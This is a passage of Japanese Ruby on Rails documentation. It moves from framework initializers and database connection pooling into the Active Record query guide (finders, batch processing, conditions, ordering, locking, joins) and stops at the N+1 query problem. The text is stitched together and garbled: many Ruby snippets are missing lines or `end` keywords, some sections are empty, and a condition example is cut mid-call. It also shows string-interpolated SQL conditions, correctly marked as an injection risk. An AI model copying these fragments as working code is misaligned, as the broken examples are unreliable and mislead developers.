* `action_mailer.compile_config_methods`: 指定された設定用メソッドを初期化し、より高速にアクセスできるようにします。
* `set_load_path`: このイニシャライザは`bootstrap_hook`より前に実行されます。
`vendor`、`lib`、`app`以下のすべてのディレクトリ、`config.load_paths`で指定されるすべてのパスが`$LOAD_PATH`に追加されます。
* `set_autoload_paths`: このイニシャライザは`bootstrap_hook`より前に実行されます。
`app`以下のすべてのサブディレクトリと、`config.autoload_paths`で指定したすべてのパスが`ActiveSupport::Dependencies.autoload_paths`に追加されます。
* `add_routing_paths`: デフォルトですべての`config/routes.rb`ファイルを読み込み、アプリケーションのルーティングを設定します。この`config/routes.rb`ファイルは、アプリケーションだけではなく、エンジンなどのrailtiesにもあります。
* `add_locales`: `config/locales`にあるファイルを`I18n.load_path`に追加し、そのパスで指定された場所にある訳文にアクセスできるようにします。この`config/locales`は、アプリケーションだけではなく、railtiesやエンジンにもあります。
* `add_view_paths`: アプリケーションやrailtiesやエンジンにある`app/views`へのパスをビューファイルへのパスに追加します。
* `load_environment_config` 現在の環境に`config/environments`を読み込みます。
* `append_asset_paths`: アプリケーションと、それに追加されているrailtiesに含まれているアセットパスを探索し、`config.static_asset_paths`で指定されているディレクトリを監視します。
* `prepend_helpers_path`: アプリケーションやrailtiesやエンジンに含まれる`app/helpers`ディレクトリをヘルパーへの参照パスに追加します。
* `load_config_initializers`: アプリケーションやrailtiesやエンジンに含まれる`config/initializers`にあるRubyファイルをすべて読み込みます。
このディレクトリに置かれているファイルは、フレームワークの読み込みがすべて読み終わってから行いたい設定を保存しておくのにも使用できます。
* `engines_blank_point`: エンジンの読み込みが完了する前に行いたい処理がある場合に使用できる初期化ポイントへのフックを提供します。
初期化処理がここまで進むと、railtiesやエンジンイニシャライザはすべて起動しています。
* `add_generator_templates`: アプリケーションやrailtiesやエンジンにある`lib/templates`ディレクトリにあるジェネレータ用のテンプレートを探し、それらを`config.generators.templates`設定に追加します。この設定によって、すべてのジェネレータからテンプレートを参照できるようになります。
* `ensure_autoload_once_paths_as_subset`: `config.autoload_once_paths`に、`config.autoload_paths`以外のパスが含まれないようにします。
それ以外のパスが含まれている場合は例外が発生します。
* `add_to_prepare_blocks`: アプリケーションやrailtiesやエンジンのすべての`config.to_prepare`呼び出しにおけるブロックが、Action Dispatchの`to_prepare`に追加されます。Action Dispatchはdevelopmentモードではリクエストごとに実行され、productionモードでは最初のリクエストより前に実行されます。
* `add_builtin_route`: アプリケーションがdevelopment環境で動作している場合、`rails/info/properties`へのルーティングをアプリケーションのルーティングに追加します。
このルーティングにアクセスすると、デフォルトのRailsアプリケーションで`public/index.html`に表示されるのと同様の詳細情報(RailsやRubyのバージョンなど)が表示されます。
* `build_middleware_stack`: アプリケーションのミドルウェアスタックを構成し、`call`メソッドを持つオブジェクトを返します。この`call`メソッドは、リクエストに対するRack環境のオブジェクトを引数に取ります。
* `eager_load!`: `config.eager_load`がtrueに設定されている場合、`config.before_eager_load`フックを実行し、続いて`eager_load!`を呼び出します。この呼び出しにより、すべての`config.eager_load_namespaces`が呼び出されます。
* `finisher_hook`: アプリケーションの初期化プロセス完了後に実行されるフックを提供し、アプリケーションやrailtiesやエンジンの`config.after_initialize`ブロックもすべて実行します。
* `set_routes_reloader`: `ActionDispatch::Callbacks.to_prepare`を使用してルーティングを再読み込みするためにAction Dispatchを構成します。
* `disable_dependency_loading`: `config.eager_load`がtrueの場合は自動依存性読み込み(automatic dependency loading)を無効にします。
データベース接続をプールする
----------------
Active Recordのデータベース接続は`ActiveRecord::ConnectionAdapters::ConnectionPool`によって管理されます。これは、接続数に限りのあるデータベース接続にアクセスする際のスレッド数と接続プールが同期するようにするものです。
最大接続数はデフォルトで5ですが、`database.yml`でカスタマイズ可能です。
接続プールはデフォルトではActive Recordで取り扱われるため、アプリケーションサーバーの動作は、ThinやmongrelやUnicornなどどれであっても同じ振る舞いになります。
最初はデータベース接続のプールは空で、必要に応じて追加接続が作成され、接続プールの上限に達するまで接続が追加されます。
1つのリクエストの中での接続は常に次のような流れになります: 初回はデータベースアクセスの必要な接続を確保し、以後はその接続があることを再確認します。リクエストの終わりでは、キューで待機する次以降のリクエストに備えて接続スロットが追加で利用できるようになります。
利用可能な数よりも多くの接続を使用しようとすると、Active Recordは接続をブロックし、プールからの接続を待ちます。
接続が行えなくなると、以下のようなタイムアウトエラーがスローされます。
ActiveRecord::ConnectionTimeoutError - could not obtain a database connection within 5 seconds. 
The max pool size is currently 5; consider increasing it:
上のエラーが発生するような場合は、`database.yml`の`pool`オプションの数値を増やして接続プールのサイズを増やすことで対応できます。
NOTE: アプリケーションをマルチスレッド環境で実行している場合、多くのスレッドが多くの接続に同時アクセスする可能性があります。
現時点のリクエストの負荷によっては、限られた接続数を多数のスレッドが奪い合うようなことになるかもしれません。
```ruby
=> true
Active Record クエリインターフェイス
=============================
このガイドでは、Active Recordを使用してデータベースからデータを取り出すためのさまざまな方法について解説します。
* 多くのメソッドや条件を駆使してレコードを検索する
* 検索されたレコードのソート順、取り出したい属性、グループ化の有無などを指定する
* 一括読み込み (eager loading) を使用して、データ取り出しに必要なクエリの実行回数を減らす
* 動的検索メソッドを使用する
* 特定のレコードが存在するかどうかをチェックする
* Active Recordモデルでさまざまな計算を行う
* リレーションでEXPLAINを実行する
生のSQLを使用してデータベースのレコードを検索することに慣れきった人がRailsに出会うと、Railsでは同じ操作をずっと洗練された方法で実現できることに気付くでしょう。
Active Recordを使用することで、SQLを直に実行する必要はほぼなくなります。
本ガイドのコード例では、基本的に以下のモデルを使用します。
TIP: 特に記さない限り、モデル中の`id`は主キーを表します。
class Client < ActiveRecord::Base
  has_one :address
  has_many :orders
  has_and_belongs_to_many :roles
class Address < ActiveRecord::Base
  belongs_to :client
class Order < ActiveRecord::Base
  belongs_to :client, counter_cache: true
class Role < ActiveRecord::Base
  has_and_belongs_to_many :clients
Active Recordは、ユーザーに代わってデータベースにクエリを発行します。発行されるクエリは多くのデータベースシステム (MySQL、PostgreSQL、SQLiteなど) と互換性があります。
Active Recordを使用していれば、利用しているデータベースシステムの種類にかかわらず、同じ表記を使用できます。
データベースからオブジェクトを取り出す
------------------------------------
Active Recordでは、データベースからオブジェクトを取り出すための検索メソッドを多数用意しています。
これらの検索メソッドを使用することで、生のSQLを書くことなく、データベースへの特定のクエリを実行するための引数を渡すことができます。
以下のメソッドが用意されています。
* `bind`
* `create_with`
* `distinct`
* `eager_load`
* `extending`
* `from`
* `group`
* `having`
* `includes`
* `joins`
* `limit`
* `lock`
* `none`
* `offset`
* `order`
* `preload`
* `readonly`
* `references`
* `reorder`
* `reverse_order`
* `select`
* `uniq`
* `where`
上のメソッドは、すべて`ActiveRecord::Relation`のインスタンスを返します。
`Model.find(options)`という操作を要約すると以下のようになります。
* 与えられたオプションを同等のSQLクエリに変換します。
* SQLクエリを発行し、該当する結果をデータベースから取り出します。
* 得られた結果を行ごとに同等のRubyオブジェクトとしてインスタンス化します。
### 単一のオブジェクトを取り出す
Active Recordには、単一のオブジェクトを取り出すためのさまざま方法が用意されています。
#### `find`
`find`メソッドを使用すると、与えられたどのオプションにもマッチする _主キー_ に対応するオブジェクトを取り出すことができます。
以下に例を示します。
# Find the client with primary key (id) 10.
client = Client.find(10)
# => #<Client id: 10, first_name: "Ryan">
これと同等のSQLは以下のようになります。
SELECT * FROM clients WHERE (clients.id = 10) LIMIT 1
`find`メソッドでマッチするレコードが見つからない場合、`ActiveRecord::RecordNotFound`例外が発生します。
このメソッドを使用して、複数のオブジェクトへのクエリを作成することもできます。
これを行うには、`find`メソッドの呼び出し時に主キーの配列を渡します。
これにより、与えられた _主キー_ にマッチするレコードをすべて含む配列が返されます。
# Find the clients with primary keys 1 and 10.
client = Client.find([1, 10]) # Client.find(1, 10)でもよい
# => [#<Client id: 1, first_name: "Lifo">, #<Client id: 10, first_name: "Ryan">]
SELECT * FROM clients WHERE (clients.id IN (1,10))
WARNING: `find`メソッドで与えられた主キーの中に、どのレコードにもマッチしない主キーが**1つでも**あると、`ActiveRecord::RecordNotFound`例外が発生します。
#### `take`
`take`メソッドはレコードを1つ取り出します。どのレコードが取り出されるかは指定されません。
client = Client.take
# => #<Client id: 1, first_name: "Lifo">
SELECT * FROM clients LIMIT 1
`Model.take`は、モデルにレコードが1つもない場合に`nil`を返します。このとき例外は発生しません。
`take`メソッドで返すレコードの最大数を数値の引数で指定することもできます。
例:
client = Client.take(2)
# => [
  #<Client id: 1, first_name: "Lifo">,
  #<Client id: 220, first_name: "Sara">
SELECT * FROM clients LIMIT 2
TIP: このメソッドで取り出されるレコードは、使用するデータベースエンジンによっても異なることがあります。
#### `first`
`first`メソッドは、主キー順の最初のレコードを取り出します。
client = Client.first
SELECT * FROM clients ORDER BY clients.id ASC LIMIT 1
`first`メソッドは、モデルにレコードが1つもない場合に`nil`を返します。このとき例外は発生しません。
`first`メソッドで返すレコードの最大数を数値の引数で指定することもできます。
例：
client = Client.first(3)
  #<Client id: 2, first_name: "Fifo">,
  #<Client id: 3, first_name: "Filo">
SELECT * FROM clients ORDER BY clients.id ASC LIMIT 3
`first!`メソッドの動作は、マッチするレコードが見つからない場合に`ActiveRecord::RecordNotFound`例外が発生する点を除いて、`first`メソッドとまったく同じです。
#### `last`
`last`メソッドは、主キー順の最後のレコードを取り出します。
client = Client.last
# => #<Client id: 221, first_name: "Russel">
SELECT * FROM clients ORDER BY clients.id DESC LIMIT 1
last`メソッドは、モデルにレコードが1つもない場合に`nil`を返します。このとき例外は発生しません。
`last`メソッドで返すレコードの最大数を数値の引数で指定することもできます。
client = Client.last(3)
  #<Client id: 219, first_name: "James">,
  #<Client id: 220, first_name: "Sara">,
  #<Client id: 221, first_name: "Russel">
SELECT * FROM clients ORDER BY clients.id DESC LIMIT 3
`last!`メソッドの動作は、マッチするレコードが見つからない場合に`ActiveRecord::RecordNotFound`例外が発生する点を除いて、`last`メソッドとまったく同じです。
#### `find_by`
`find_by`メソッドは、与えられた条件にマッチするレコードのうち最初のレコードだけを返します。
Client.find_by first_name: 'Lifo'
Client.find_by first_name: 'Jon'
# => nil
上の文は以下のように書くこともできます。
Client.where(first_name: 'Lifo').take
`find_by!`メソッドの動作は、マッチするレコードが見つからない場合に`ActiveRecord::RecordNotFound`例外が発生する点を除いて、`find_by`メソッドとまったく同じです。
Client.find_by! 
first_name: 'does not exist'
# => ActiveRecord::RecordNotFound
上の文は以下のように書くこともできます。
Client.where(first_name: 'does not exist').take!
### 複数のオブジェクトをバッチで取り出す
多数のレコードに対して反復処理を行いたいことがあります。たとえば、多くのユーザーにニュースレターを送信したい、データをエクスポートしたいなどです。
このような処理をそのまま実装すると以下のようになるでしょう。
# このような処理を数千件ものレコードに対して実行すると、効率が大幅に低下します。
User.all.each do |user|
  NewsMailer.weekly(user).deliver_now
しかし上のような処理は、テーブルのサイズが大きくなるにつれて非現実的になります。`User.all.each`は、Active Recordに対して _テーブル全体_ を一度に取り出し、しかも1行ごとにオブジェクトを生成し、その巨大なモデルオブジェクトの配列をメモリに配置するからです。
もし莫大な数のレコードに対してこのようなコードをまともに実行すると、コレクション全体のサイズがメモリ容量を上回ってしまうことでしょう。
Railsでは、メモリを圧迫しないサイズにバッチを分割して処理するための方法を2とおり提供しています。
1つ目は`find_each`メソッドを使用する方法です。これは、レコードのバッチを1つ取り出し、次に _各_ レコードを1つのモデルとして個別にブロックにyieldします。
2つ目の方法は`find_in_batches`メソッドを使用する方法です。レコードのバッチを1つ取り出し、次に _バッチ全体_ をモデルの配列としてブロックにyieldします。
TIP: `find_each`メソッドと`find_in_batches`メソッドは、一度にメモリに読み込めないような大量のレコードに対するバッチ処理のためのものです。
数千のレコードに対して単にループ処理を行なうのであれば通常の検索メソッドで十分です。
#### `find_each`
`find_each`メソッドは、レコードのバッチを1つ取り出し、続いて _各_ レコードを1つのモデルとして個別にブロックにyieldします。
以下の例では、`find_each`で1000件のレコードを取り出しています。この件数は`find_each`と`find_in_batches`のどちらでもデフォルト値として使用されており、続いて各レコードを1つのモデルとしてブロックに個別にyieldします。
この処理は、すべてのレコードが処理されるまで繰り返されます。
User.find_each do |user|
`find_each`では、`where`などのActive Recordメソッドを連鎖 (chain) させることで条件を追加することができます。
User.where(weekly_subscriber: true).find_each do |user|
##### `find_each`のオプション
`find_each`メソッドでは、通常の`find`メソッドとほぼ同じオプションが使用できます。`:order`と`:limit`は`find_each`内部で利用するために予約されており、使用できません。
**`:batch_size`**
`:batch_size`オプションは、(ブロックに個別に渡される前に) 1回のバッチで取り出すレコード数を指定します。
たとえば、1回に5000件ずつ処理したい場合は以下のように指定します。
User.find_each(batch_size: 5000) do |user|
デフォルトでは、レコードは主キーの昇順に取り出されます。主キーは整数でなければなりません。
これは、たとえば中断したバッチ処理を再開する場合などに便利です (最後に実行された処理のIDがチェックポイントとして保存済みであることが前提です)。
たとえば、1回のバッチで5000件を取り出し、主キーが2000以降のユーザーだけにニュースレターを送信したい場合は以下のようにします。
#### `find_in_batches`
`find_in_batches`メソッドは、レコードをバッチで取り出すという点で`find_each`と似ています。
違うのは、`find_in_batches`は _バッチ_ を個別にではなくモデルの配列としてブロックにyieldするという点です。
以下の例では、与えられたブロックに対して一度に最大1000までの納品書 (invoice) の配列をyieldしています。最後のブロックには残りの納品書が含まれます。
# 1回あたりadd_invoicesに納品書1000通の配列を渡す
Invoice.find_in_batches do |invoices|
  export.add_invoices(invoices)
##### `find_in_batches`のオプション
options
条件
----------
`where`メソッドは、返されるレコードを制限するための条件を指定します。SQL文で言う`WHERE`の部分に相当します。
条件は、文字列、配列、ハッシュのいずれかの方法で与えることができます。
### 文字列だけで表された条件
検索メソッドに条件を追加したい場合、たとえば`Client.where("orders_count = '2'")`のように条件を単純に指定することができます。
この場合、`orders_count`フィールドの値が2であるすべてのクライアントが検索されます。
WARNING: 条件を文字列だけで構成すると、SQLインジェクションの脆弱性が発生する可能性があります。
たとえば、`Client.where("first_name LIKE '%#{params[:first_name]}%'")`という書き方は危険です。
次で説明するように、配列を使用するのが望ましい方法です。
### 配列で表された条件
条件で使用する数値が変動する可能性がある場合、引数をどのようにすればよいでしょうか。
この場合は以下のようにします。
Client.where("orders_count = ?", params[:orders])
Active Recordは条件値の最初の要素を調べ、その後に要素が追加されていたら、最初の要素の中にある疑問符`(?)`を追加要素で置き換えます。
複数の条件を指定したい場合は次のようにします。
AND locked = ?", params[:orders], false)
上の例では、1つ目の疑問符は`params[:orders]`の値で置き換えられ、2つ目の疑問符は`false`をSQL形式に変換したもの (変換方法はアダプタによって異なる) で置き換えられます。
以下のようなコードの書き方を強く推奨します。
以下の書き方は危険であり、避ける必要があります。
Client.where("orders_count = #{params[:orders]}")
条件文字列の中に変数を直接置くと、その変数はデータベースに **そのまま** 渡されてしまいます。
これは、悪意のある人物がエスケープされていない危険な変数を渡すことができるということです。
このようなコードがあると、悪意のある人物がデータベースを意のままにすることができ、データベース全体が危険にさらされます。
くれぐれも、条件文字列の中に引数を直接置くことはしないでください。
TIP: SQLインジェクションの詳細については[Ruby on Railsセキュリティガイド](security.html#sqlインジェクション)を参照してください。
#### プレースホルダを使用した条件
疑問符`(?)`をパラメータで置き換えるスタイルと同様、配列による条件中でキー/値のハッシュを指定できます。
Client.where("created_at >= :start_date AND created_at <= :end_date",
  {start_date: params[:start_date], end_date: params[:end_date]})
このように書くことで、条件で多数の変数が使用されている場合にコードが読みやすくなります。
### ハッシュを使用した条件
Active Recordは条件をハッシュで渡すこともできます。この書式を使用することで条件構文が読みやすくなります。
条件をハッシュで渡す場合、ハッシュのキーには条件付けしたいフィールドを、ハッシュの値にはそのフィールドをどのように条件づけするかを、それぞれ指定します。
NOTE: ハッシュによる条件は、等値、範囲、サブセットのチェックでのみ使用できます。
#### 等値条件
Client.where(locked: true)
フィールド名は文字列形式にすることもできます。
Client.where('locked' => true)
belongs_toリレーションシップの場合、Active Recordオブジェクトが値として使用されていれば、モデルを指定する時に関連付けキーを使用できます。
この方法はポリモーフィックリレーションシップでも同様に使用できます。
Article.where(author: author)
Author.joins(:articles).where(articles: { author: author })
NOTE: この値はシンボルにすることはできません。
たとえば`Client.where(status: :active)`のような書き方はできません。
#### 範囲条件
Client.where(created_at: (Time.now.midnight - 1.day)..
上の例では、昨日作成されたすべてのクライアントを検索します。内部ではSQLの`BETWEEN`文が使用されます。
SELECT * FROM clients WHERE (clients.created_at BETWEEN '2008-12-21 00:00:00' AND '2008-12-22 00:00:00')
[配列で表された条件](#配列で表された条件)では、さらに簡潔な文例をご紹介しています。
#### サブセット条件
SQLの`IN`式を使用してレコードを検索したい場合、条件ハッシュにそのための配列を1つ渡すことができます。
Client.where(orders_count: [1,3,5])
上のコードを実行すると、以下のようなSQLが生成されます。
SELECT * FROM clients WHERE (clients.orders_count IN (1,3,5))
### NOT条件
SQLの`NOT`クエリは、`where.not`で表せます。
Article.where.not(author: author)
言い換えれば、このクエリは`where`に引数を付けずに呼び出し、直後に`where`条件に`not`を渡して連鎖させることによって生成されています。
並び順
データベースから取り出すレコードを特定の順序で並べ替えたい場合、`order`を使用できます。
たとえば、ひとかたまりのレコードを取り出し、それをテーブル内の`created_at`の昇順で並べたい場合には以下のようにします。
Client.order(:created_at)
Client.order("created_at")
`ASC`(昇順)や`DESC`(降順)を指定することもできます。
Client.order(created_at: :desc)
Client.order(created_at: :asc)
Client.order("created_at DESC")
Client.order("created_at ASC")
複数のフィールドを指定して並べることもできます。
Client.order(orders_count: :asc, created_at: :desc)
Client.order(:orders_count, created_at: :desc)
Client.order("orders_count ASC, created_at DESC")
Client.order("orders_count ASC", "created_at DESC")
Client.order("orders_count ASC").order("created_at DESC")
# SELECT * FROM clients ORDER BY orders_count ASC, created_at DESC
特定のフィールドだけを取り出す
デフォルトでは、`Model.find`を実行すると、結果セットからすべてのフィールドが選択されます。内部的にはSQLの`select *`が実行されています。
結果セットから特定のフィールドだけを取り出したい場合、`select`メソッドを使用できます。
たとえば、`viewable_by`カラムと`locked`カラムだけを取り出したい場合は以下のようにします。
Client.select("viewable_by, locked")
上で実際に使用されるSQL文は以下のようになります。
SELECT viewable_by, locked FROM clients
selectを使用すると、選択したフィールドだけを使用してモデルオブジェクトが初期化されるため、注意してください。
モデルオブジェクトの初期化時に指定しなかったフィールドにアクセスしようとすると、以下のメッセージが表示されます。
```bash
`<属性名>`は、アクセスしようとした属性です。
`id`メソッドは、この`ActiveRecord::MissingAttributeError`を発生しません。このため、関連付けを扱う場合には注意してください。関連付けが正常に動作するには`id`メソッドが必要だからです。
特定のフィールドについて、重複のない一意の値を1レコードだけ取り出したい場合、`distinct`を使用できます。
Client.select(:name).distinct
上のコードを実行すると、以下のようなSQLが生成されます。
SELECT DISTINCT name FROM clients
一意性の制約を外すこともできます。
query = Client.select(:name).distinct
# => 重複のない一意の名前が返される
query.distinct(false)
# => 重複の有無を問わずすべての名前が返される
LimitとOffset
`Model.find`で実行されるSQLに`LIMIT`を適用したい場合、リレーションで`limit`メソッドと`offset`メソッドを使用することで`LIMIT`を指定できます。
`limit`メソッドは、取り出すレコード数の上限を指定します。`offset`は、レコードを返す前にスキップするレコード数を指定します。
Client.limit(5)
上を実行するとクライアントが最大で5つ返されます。オフセットは指定されていないので、最初の5つがテーブルから取り出されます。
この時実行されるSQLは以下のような感じになります。
SELECT * FROM clients LIMIT 5
`offset`を追加すると以下のようになります。
Client.limit(5).offset(30)
上のコードは、最初の30クライアントをスキップして31人目から最大5人のクライアントを返します。
このときのSQLは以下のようになります。
SELECT * FROM clients LIMIT 5 OFFSET 30
グループ
-----
検索メソッドで実行されるSQLに`GROUP BY`句を追加したい場合は、`group`メソッドを検索メソッドに追加できます。
たとえば、注文 (order) の作成日のコレクションを検索したい場合は、以下のようにします。
Order.select("date(created_at) as ordered_date, sum(price) as total_price").group("date(created_at)")
上のコードは、データベースで注文のある日付ごとに`Order`オブジェクトを1つ作成します。
上で実行されるSQLは以下のようなものになります。
SELECT date(created_at) as ordered_date, sum(price) as total_price
FROM orders
GROUP BY date(created_at)
### グループ化された項目の合計
グループ化した項目の合計をひとつのクエリで得るには、`group`の次に`count`を呼び出します。
Order.group(:status).count
# => { 'awaiting_approval' => 7, 'paid' => 12 }
SELECT COUNT (*) AS count_all, status AS status
FROM "orders"
GROUP BY status
Having
------
SQLでは、`GROUP BY`フィールドで条件を指定する場合に`HAVING`句を使用します。
Order.select("date(created_at) as ordered_date, sum(price) as total_price").
  group("date(created_at)").having("sum(price) > ?", 100)
HAVING sum(price) > 100
上の例では、1日あたり1つの注文 (order) オブジェクトを返しますが、1日あたりの注文合計が$100を超える場合にのみこれを行います。
条件を上書きする
### `unscope`
`unscope`を使用して特定の条件を取り除くことができます。
Article.where('id > 10').limit(20).order('id asc').unscope(:order)
上で実行されるSQLは以下のようなものになります。
SELECT * FROM articles WHERE id > 10 LIMIT 20
# `unscope`する前のオリジナルのクエリ
SELECT * FROM articles WHERE id > 10 ORDER BY id asc LIMIT 20
特定の`where`句で`unscope`を指定することもできます。
Article.where(id: 10, trashed: false).unscope(where: :id)
# SELECT "articles".
* FROM "articles" WHERE trashed = 0
`unscope`をリレーションに適用すると、それにマージされるすべてのリレーションにも影響します。
Article.order('id asc').merge(Article.unscope(:order))
* FROM "articles"
### `only`
`only`メソッドを使用すると、条件を上書きできます。
Article.where('id > 10').limit(20).order('id desc').only(:order, :where)
SELECT * FROM articles WHERE id > 10 ORDER BY id DESC
# `only`を使用する前のオリジナルのクエリ
SELECT "articles".
* FROM "articles" WHERE (id > 10) ORDER BY id desc LIMIT 20
### `reorder`
`reorder`メソッドは、デフォルトのスコープの並び順を上書きします。
class Article < ActiveRecord::Base
  has_many :comments, -> { order('posted_at DESC') }
Article.find(10).comments.reorder('name')
SELECT * FROM articles WHERE id = 10
SELECT * FROM comments WHERE article_id = 10 ORDER BY name
`reorder`を実行しなかった場合に実行されるSQLは以下のようなものになります。
SELECT * FROM comments WHERE article_id = 10 ORDER BY posted_at DESC
### `reverse_order`
`reverse_order`メソッドは、並び順が指定されている場合に並び順を逆にします。
Client.where("orders_count > 10").order(:name).reverse_order
SELECT * FROM clients WHERE orders_count > 10 ORDER BY name DESC
SQLクエリで並び順を指定する句がない場合に`reverse_order`を実行すると、主キーの逆順になります。
Client.where("orders_count > 10").reverse_order
このメソッドは引数を**取りません**。
### `rewhere`
`rewhere`メソッドは、既存のwhere条件を上書きします。
Article.where(trashed: true).rewhere(trashed: false)
SELECT * FROM articles WHERE `trashed` = 0
`rewhere`の代わりに`where`を2回使用すると、結果が異なります。
Article.where(trashed: true).where(trashed: false)
上で実行されるSQLは以下のようなものになります。
SELECT * FROM articles WHERE `trashed` = 1 AND `trashed` = 0
Nullリレーション
-------------
`none`メソッドは、連鎖 (chain) 可能なリレーションを返します (レコードは返しません)。
このメソッドから返されたリレーションにどのような条件を連鎖させても、常に空のリレーションが生成されます。
これは、メソッドまたはスコープへの連鎖可能な応答が必要で、しかも結果を一切返したくない場合に便利です。
Article.none # 空のリレーションを返し、クエリを生成しない。
# visible_articles メソッドはリレーションを1つ返すことが期待されている
@articles = current_user.visible_articles.where(name: params[:name])
def visible_articles
  case role
  when 'Country Manager'
    Article.where(country: country)
  when 'Reviewer'
    Article.published
  when 'Bad User'
    Article.none # => この場合[]またはnilを返し、呼び出し側のコードを中断する
読み取り専用オブジェクト
Active Recordには、返されたどのオブジェクトに対しても変更を明示的に禁止する`readonly`メソッドがあります。
読み取り専用を指定されたオブジェクトに対する変更の試みはすべて失敗し、`ActiveRecord::ReadOnlyRecord`例外が発生します。
client = Client.readonly.first
client.visits += 1
client.save
上のコードでは `client`に対して明示的に`readonly`が指定されているため、 _visits_ の値を更新して `client.save`を行なうと`ActiveRecord::ReadOnlyRecord`例外が発生します。
レコードを更新できないようロックする
ロックは、データベースのレコードを更新する際の競合状態を避け、アトミックな (=中途半端な状態のない) 更新を行なうために有用です。
Active Recordには2とおりのロック機構があります。
* 楽観的ロック (optimistic)
* 悲観的ロック (pessimistic)
### 楽観的ロック (optimistic)
楽観的ロックでは、複数のユーザーが同じレコードを編集することを許し、データの衝突が最小限であることを仮定しています。
この方法では、レコードがオープンされてから変更されたことがあるかどうかをチェックします。
そのような変更が行われ、かつ更新が無視された場合、`ActiveRecord::StaleObjectError`例外が発生します。
**楽観的ロックカラム**
楽観的ロックを使用するには、テーブルに`lock_version`という名前のinteger型カラムがある必要があります。
Active Recordは、レコードが更新されるたびに`lock_version`カラムの値を1ずつ増やします。
更新リクエストが発生したときの`lock_version`の値がデータベース上の`lock_version`カラムの値よりも小さい場合、更新リクエストは失敗し、`ActiveRecord::StaleObjectError`エラーが発生します。
例：
c1 = Client.find(1)
c2 = Client.find(1)
c1.first_name = "Michael"
c1.save
c2.name = "should fail"
c2.save # ActiveRecord::StaleObjectErrorを発生
例外の発生後、この例外をレスキューすることで衝突を解決する必要があります。衝突の解決方法は、ロールバック、マージ、またはビジネスロジックに応じた解決方法のいずれかを使用してください。
`ActiveRecord::Base.lock_optimistically = false`を設定するとこの動作をオフにできます。
`ActiveRecord::Base`には、`lock_version`カラム名を上書きするための`locking_column`が用意されています。
  self.locking_column = :lock_client_column
### 悲観的ロック (pessimistic)
悲観的ロックでは、データベースが提供するロック機構を使用します。
リレーションの構築時に`lock`を使用すると、選択した行に対する排他的ロックを取得できます。
`lock`を使用するリレーションは、デッドロック条件を回避するために通常トランザクションの内側にラップされます。
Item.transaction do
  i = Item.lock.first
  i.name = 'Jones'
  i.save!
バックエンドでMySQLを使用している場合、上のセッションによって以下のSQLが生成されます。
BEGIN
Item Load (0.3ms)   SELECT * FROM `items` LIMIT 1 FOR UPDATE
Item Update (0.4ms)   UPDATE `items` SET `updated_at` = '2009-02-07 18:05:56', `name` = 'Jones' WHERE `id` = 1
SQL (0.8ms)   COMMIT
異なる種類のロックを使用したい場合、`lock`メソッドに生のSQLを渡すこともできます。
たとえば、MySQLには`LOCK IN SHARE MODE`という式があります。これはレコードのロック中にも他のクエリからの読み出しは許可するものです。
この式を指定するには、単にlockオプションの引数にします。
  i = Item.lock("LOCK IN SHARE MODE").find(1)
  i.increment!(:views)
モデルのインスタンスが既にある場合は、トランザクションを開始してその中でロックを一度に取得できます。
item = Item.first
item.with_lock do
  # このブロックはトランザクション内で呼び出される
  # itemはロック済み
  item.increment!(:views)
テーブルを結合する
--------------
Active Recordの検索メソッドには`joins`があり、生成されたSQLで`JOIN`句を使用できます。`joins`メソッドにはさまざまな使用方法があります。
### SQLフラグメント文字列を使用する
`joins`メソッドの引数に生のSQLを指定することで`JOIN`句を指定できます。
Client.joins('LEFT OUTER JOIN addresses ON addresses.client_id = clients.id')
これによって以下のSQLが生成されます。
SELECT clients.
* FROM clients LEFT OUTER JOIN addresses ON addresses.client_id = clients.id
### 名前付き関連付けの配列/ハッシュを使用する
WARNING: このメソッドは`INNER JOIN`でしか使用できません。
Active Recordでは、`joins`メソッドを使用して関連付けで`JOIN`句を指定する際に、モデルで定義された関連付けの名前をショートカットとして使用できます (詳細は[Active Recordの関連付け](association_basics.html)を参照)。
たとえば、以下の`Category`、`Article`、`Comment`、`Guest`、`Tag`モデルについて考えてみましょう。
class Category < ActiveRecord::Base
  has_many :articles
  belongs_to :category
  has_many :comments
  has_many :tags
class Comment < ActiveRecord::Base
  belongs_to :article
  has_one :guest
  belongs_to :comment
class Tag < ActiveRecord::Base
以下のすべてにおいて、`INNER JOIN`を使用した結合クエリが期待どおりに生成されています。
#### 単一関連付けを結合する
Category.joins(:articles)
上によって以下が生成されます。
SELECT categories.
* FROM categories
  INNER JOIN articles ON articles.category_id = categories.id
上のSQLを日本語で書くと「記事 (article) のあるすべてのカテゴリーを含む、Categoryオブジェクトを1つ返す」となります。
なお、同じカテゴリーに複数の記事がある場合、カテゴリーが重複します。
重複のない一意のカテゴリーが必要な場合は、`Category.joins(:article).uniq`を使用できます。
#### 複数の関連付けを結合する
Article.joins(:category, :comments)
SELECT articles.
* FROM articles
  INNER JOIN categories ON articles.category_id = categories.id
  INNER JOIN comments ON comments.article_id = articles.id
上のSQLを日本語で書くと、「カテゴリーが1つあり、かつコメントが1つ以上ある、すべての記事を返す」となります。
こちらも、コメントが複数ある記事は複数回表示されます。
#### ネストした関連付けを結合する (単一レベル)
Article.joins(comments: :guest)
  INNER JOIN guests ON guests.comment_id = comments.id
上のSQLを日本語で書くと、「ゲストによるコメントが1つある記事をすべて返す」となります。
#### ネストした関連付けを結合する (複数レベル)
Category.joins(articles: [{ comments: :guest }, :tags])
  INNER JOIN tags ON tags.article_id = articles.id
### 結合されたテーブルで条件を指定する
標準の[配列](#配列で表された条件)および[文字列](#文字列だけで表された条件)条件を使用して、結合テーブルに条件を指定することができます。
[ハッシュ条件](#ハッシュを使用した条件)の場合、結合テーブルで条件を指定する場合に特殊な構文を使用します。
time_range = (Time.now.midnight - 1.day)..
Client.joins(:orders).where('orders.created_at' => time_range)
さらに読みやすい別の方法として、ハッシュ条件をネストさせる方法があります。
Client.joins(:orders).where(orders: { created_at: time_range })
このコードでは、昨日作成された注文 (order) を持つすべてのクライアントを検索します。ここでもSQLの`BETWEEN`式を使用しています。
関連付けを一括読み込みする
一括読み込み (eager loading) とは、`Model.find`によって返されるオブジェクトに関連付けられたレコードを読み込むためのメカニズムであり、できるだけクエリの使用回数を減らすようにします。
**N + 1クエリ問題**
以下のコードについて考えてみましょう。クライアントを10人検索して郵便番号を表示します。
clients = Client.limit(10)
clients.each do |client|
  puts client.address.postcode
このコードは一見何の問題もないように見えます。
しかし本当の問題は、実行されたクエリの回数が無駄に多いことなのです。
上のコードでは、最初にクライアントを10人検索するのにクエリを1回発行し、次にそこから住所を取り出すのにクエリを10回発行しますので、合計で **11** 回のクエリが発行されます。
**N + 1クエリ問題を解決する**
